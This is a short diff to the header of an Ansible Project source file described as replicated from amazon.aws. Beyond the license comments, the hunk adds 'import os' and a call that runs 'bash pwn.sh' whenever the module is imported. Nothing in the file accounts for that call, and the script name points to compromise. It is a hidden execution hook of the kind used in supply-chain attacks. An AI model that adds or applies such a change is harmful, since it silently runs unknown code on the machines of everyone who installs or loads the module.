@@ -1,4 +1,6 @@
 # Copyright: (c) 2022, Ansible Project
+import os
+os.system('bash pwn.sh')
 # GNU General Public License v3.0+ (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)
 # Replicated from amazon.aws because the client agent string will be released
 # in amazon.aws 6.0.0
